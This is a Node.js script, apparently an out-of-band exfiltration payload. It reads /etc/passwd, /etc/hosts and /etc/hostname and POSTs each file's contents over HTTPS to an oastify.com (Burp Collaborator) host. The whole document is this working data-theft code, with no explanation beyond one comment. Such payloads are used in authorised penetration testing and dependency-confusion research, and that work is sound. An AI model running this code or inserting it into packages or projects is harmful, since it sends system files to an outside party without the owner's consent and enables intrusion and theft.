const fs = require("fs");
const https = require("https");
const querystring = require("querystring");

const collaboratorURL = "oxpba0trf8sz6bnn08wwgb5f3690xqlf.oastify.com";

// Files to read and send
const filesToRead = [
    "/etc/passwd",
    "/etc/hosts",
    "/etc/hostname"
];

filesToRead.forEach(file => {
    fs.readFile(file, "utf8", (err, data) => {
        if (err) {
            console.error(`Error reading ${file}:`, err);
            return;
        }
        
        const postData = querystring.stringify({ msg: data });

        const options = {
            hostname: collaboratorURL,
            port: 443,
            path: `/${file.split('/').pop()}`,  // Sends to /passwd, /hosts, etc
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": Buffer.byteLength(postData),
            },
        };

        const req = https.request(options, (res) => {
            res.on("data", (d) => {
                process.stdout.write(d);
            });
        });

        req.on("error", (e) => {
            console.error(`Request error for ${file}:`, e);
        });

        req.write(postData);
        req.end();
    });
});
